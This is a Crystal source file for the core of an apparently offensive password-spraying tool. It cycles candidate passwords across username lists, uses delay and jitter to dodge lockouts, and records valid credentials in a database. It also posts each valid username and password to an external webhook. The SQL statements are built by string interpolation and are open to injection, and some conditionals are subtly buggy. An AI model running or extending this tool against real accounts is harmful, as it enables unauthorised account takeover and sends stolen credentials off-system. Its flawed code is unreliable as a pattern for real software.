require "colorize"
require "http/client"

class User
    @username = ""
    @password = "" 
    @lockedout = false
    @attempts = [] of String
end


class Sprayer
    property usernames : Array(String), passwords : Array(String), delay : Int32 , jitter : Int32  , target : String, uap : Bool, webhook_url : String 
    property valid : Array(String)
    # property rate : Int32

    def initialize(username : String, password : String)
        @usernames = [] of String 
        @passwords = [] of String 
        @usernames << username
        @passwords << password
        @delay = 30
        @jitter = 1
        @target = "localhost"
        @uap = false
        @valid = [] of String
        @webhook_url = ""
        # @channel : Channel(Array(String|Bool|Nil) | Nil)
        # @rate = 1 
    end

    def initialize(username : String) 
        @usernames = [] of String 
        @passwords = [] of String
        @usernames << username 
        @passwords << ""
        @delay = 30
        @jitter = 1
        @target = "localhost"
        @uap = false
        @valid = [] of String
        @webhook_url = ""
    end

    def initialize(usernamear : Array(String))
        @usernames = [] of String 
        @passwords = [] of String
        @usernames = usernamear
        @passwords << ""
        @delay = 30
        @target = "localhost"
        @jitter = 1
        @valid = [] of String
        @uap = false
        @webhook_url = ""
    end

    def initialize(usernamear : Array(String), passwordar : Array(String))
        @usernames = [] of String 
        @passwords = [] of String
        @usernames = usernamear 
        @passwords = passwordar
        @delay = 30
        @jitter = 1
        @target = "localhost"
        @valid = [] of String
        @uap = false
        @webhook_url = ""
    end


    # super method as placeholder. this is for the single logon attempt code per "module"
    # below is just for testing purposes  
    # should return an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) 
        puts "DEFAULT METHOD!!! YOUR SPRAY IS NOT ACTUALLY WORKING!!!!".colorize(:red)

        # the below is just a simulation for testing purposes

        islockedout = false
        isvalid = false
        mfa = false
        #simulating an attempt
        x = rand() 
        if (x = x.round() == 1  )
            islockedout = true
        end        
        x = rand() 
        if x = x.round() == 1 
            isvalid = true 
        end
        x = rand() 
        if x = x.round() == 1 
            mfa = true 
        end
        # return an array of [username, password, valid, lockedout, mfa] that way the parent can maintain a list without worrying about the child classes
        return [username, password, isvalid, islockedout, mfa]

    end

    # starts the sprayer with a jitter of 1 and a delay of 30 
    def start(thread_count = 1, db = nil)
        @lockout = false
        cont = false 
        already_sprayed = [] of String
        valid_accounts = [] of String

        # create list of already sprayed user:passwords 
        if db
            already_sprayed = get_dbsprayed(db).as(Array(String))
            valid_accounts = get_dbvalid(db).as(Array(String))
        end  

        # queue_channel = Channel(Array(S))

        




        # if user as password just spray once
        if @uap
            usernames.each do |uname|
                if already_sprayed.includes? "#{uname}:#{uname}" || valid_accounts.includes? uname
                    STDERR.puts "Skipping #{uname}:#{uname} becasue its already sprayed!!".colorize(:yellow).to_s
                    next
                end
                attempt = spray(uname, uname)
                next if attempt.nil?
                @lockout = attempt[3].as(Bool|Nil)
                if @lockout && cont == false
                    STDERR.puts "Lockout detected!!!".colorize(:red)
                    STDERR.puts "Continue? (y/N)".colorize(:yellow)
                    x = gets
                    return if x.nil? || x == "\r"
                    if (x.downcase =~ /ye?s?/)
                        cont = true
                    else 
                        STDERR.puts "Quiting spraying attack!!!".colorize(:yellow)
                        return
                    end
                end
                
               

                if db
                    insert_db_sprayed(db, uname, uname) unless attempt[3] # add to sprayed unless it was locked
                    insert_db_valid(db, uname, uname) if attempt[2] # ie valid
                end


                puts "#{attempt[0].as(String)}, #{attempt[1].as(String)},#{" Valid".colorize(:green).to_s if attempt[2]},#{" locked" if attempt[3]}, #{" mfa" if attempt[4]}"
                jitter() unless uname == usernames.last
            end
            return 
        end
        # all other user/pass combos
        passwords.each do |pass|
            puts "Spraying password: ".colorize(:yellow).to_s + pass
            usernames.each do |uname|
                if already_sprayed.includes? "#{uname}:#{pass}" || valid_accounts.includes? uname
                    STDERR.puts "Skipping #{uname}:#{pass} becasue its already sprayed!!".colorize(:yellow).to_s
                    next 
                end
                attempt = spray(uname, pass)
                next if attempt.nil?
                @lockout = attempt[3].as(Bool|Nil)

                if @lockout && cont == false
                    STDERR.puts "Lockout detected!!!".colorize(:red)
                    STDERR.puts "Continue? (y/N)".colorize(:yellow)
                    x = gets
                    return if x.nil?
                    if (x.downcase =~ /[yes]+/)
                        cont = true
                    else 
                        STDERR.puts "Quiting spraying attack!!!".colorize(:yellow)
                        return
                    end
                end



                if db
                    insert_db_sprayed(db, uname, pass)
                    insert_db_valid(db, uname, pass) if attempt[2]
                end


                # puts "#{uname}, #{pass}, #{(attempt[2]) ? "valid" : "invalid".colorize(:red).to_s }, #{ (attempt[3]) ? "locked".colorize(:red).to_s : "notlocked"  }"
                puts "#{attempt[0].as(String)}, #{attempt[1].as(String)},#{" valid".colorize(:green).to_s if attempt[2]},#{" locked".colorize(:red).to_s if attempt[3]}, #{" mfa".colorize(:yellow).to_s if attempt[4]}"
                # if valid and webhook not "" send webhook 
                if attempt[2] && @webhook_url != ""
                    web_hook(attempt[0].as(String), attempt[1].as(String), attempt[4])
                end
                jitter() unless uname == usernames.last || valid_accounts.includes? uname || already_sprayed.includes? "#{uname}:#{pass}"
            end

            puts "Sleeping for #{@delay} Seconds!!".colorize(:yellow).to_s
            # sleep @delay unless pass == passwords.last
            delay() unless pass == passwords.last
        end

    end

    protected def insert_db_sprayed(db,username,password)
        
        begin 
            db.exec "insert into username(username) values (\"#{username}\")"
        rescue e 
            # STDERR.puts e.message
        end

        begin 
            db.exec "insert into password(password) values (\"#{password}\")"
        rescue e 
            # STDERR.puts e.message
        end

        # add sprayed combo to sprayed list
        begin  
            db.exec "
                    insert into passwords_sprayed
                    select username.usernameid, password.passwordid , DATETIME('now','localtime')
                    from username, password 
                    where 
                    username.username = \"#{username}\"
                    and 
                    password.password = \"#{password}\";" # dont add to attempted if locked
        rescue e 
            # STDERR.puts e.message
        end
    end

    protected def insert_db_valid(db,username,password)
        begin 
            db.exec "insert into username(username) values (\"#{username}\")"
        rescue e 
            # STDERR.puts e.message
        end

        begin 
            db.exec "insert into password(password) values (\"#{password}\")"
        rescue e 
            # STDERR.puts e.message
        end

        begin 
            # if valid add to that table too 
                db.exec "insert into valid_passwords
                    select username.usernameid, password.passwordid, DATETIME('now','localtime')
                    from username, password 
                    where 
                    username.username = \"#{username}\"
                    and 
                    password.password = \"#{password}\";"
            rescue e 
                # STDERR.puts "Valid Error: "
                # STDERR.puts e.message
            end
    end

    protected def get_dbsprayed(db) # : Array(String)
        already_sprayed = [] of String
        begin 
            # populate previously sprayed accounts 
            db.query "select username.username, password.password
            from username, password, passwords_sprayed
            where 
            username.usernameid = passwords_sprayed.usernameid
            and 
            password.passwordid = passwords_sprayed.passwordid;" do |rs|
                rs.each do
                    already_sprayed << "#{rs.read(String)}:#{rs.read(String)}"
                end
            end

        rescue e 
            STDERR.puts "Error: #{e.message}"
            STDERR.puts "Could not get list of previous spray attempts!! Possible passwords already sprayed may be sprayed again!!!"
            STDERR.print "Would you like to exit? Y/n"
            x = gets
            return if x.nil?
            if( x.downcase =~ /ye?s?/ || x == "\r")
                STDOUT.puts "Exiting!"
                exit 0
            else 
                STDERR.puts "Continuing...."
            end
        end
        return already_sprayed
    end

    protected def get_dbvalid(db)#  : Array(String)
        valid_accounts = [] of String
        begin 
            # populate valid accounts 
            db.query "select username.username, password.password 
            from username, password, valid_passwords
            where 
            username.usernameid = valid_passwords.usernameid
            and 
            password.passwordid = valid_passwords.passwordid;" do |rs|
                rs.each do
                    valid_accounts << "#{rs.read(String)}"
                end
            end

        rescue e 
            STDERR.puts "Error: #{e.message}"
            STDERR.puts "Could not get list of valid spray attempts!! Possible passwords already sprayed may be sprayed again!!!"
            STDERR.print "Would you like to exit? y/N"
            x = gets
            return if x.nil?
            if( x.downcase =~ /ye?s?/)
                STDOUT.puts "Exiting!"
                exit 0
            else 
                STDERR.puts "Continuing...."
            end
        end
        return valid_accounts
    end



    protected def jitter()
        if @jitter < 1000
            print "Jitter: #{@jitter / 1000}"
            sleep ( @jitter / 1000 )
            print "\r                        \r"
            return 
        end
        @jitter.times do |t|
            print "\rJitter: #{@jitter - t} "
            sleep 0.001
        end 
        print "\r                        \r"
    end

    protected def delay()
        @delay.times do |t|
            print "\rSleeping: #{@delay - t} "
            sleep 1
        end
        print "\n"
    end



    protected def web_hook(username, password, mfa)
        mfa_str = "No"
        mfa_str = "Yes" if mfa
        card = "
        {
            \"@type\": \"MessageCard\",
            \"@context\": \"http://schema.org/extensions\",
            \"themeColor\": \"0076D7\",
            \"summary\": \"Valid Password Found!!!!\",
            \"sections\": [{
                \"activityTitle\": \"Valid Password Found!!!!!\",
                \"facts\": [{
                    \"name\": \"User: \",
                    \"value\": \"#{username}\"
                }, {
                    \"name\": \"Password:\",
                    \"value\": \"#{password}\"
                },{
                    \"name\": \"MFA:\",
                    \"value\": \"#{mfa_str}\"
                }],
                \"markdown\": true
            }]
        }
        "
        answer = HTTP::Client.post( URI.parse( @webhook_url ) , body: card)
        if answer.body.to_i  != 1 
            STDERR.puts "Web Hook Is BROKEN!!!!!!!!!!".colorize(:red)
        end

    end

end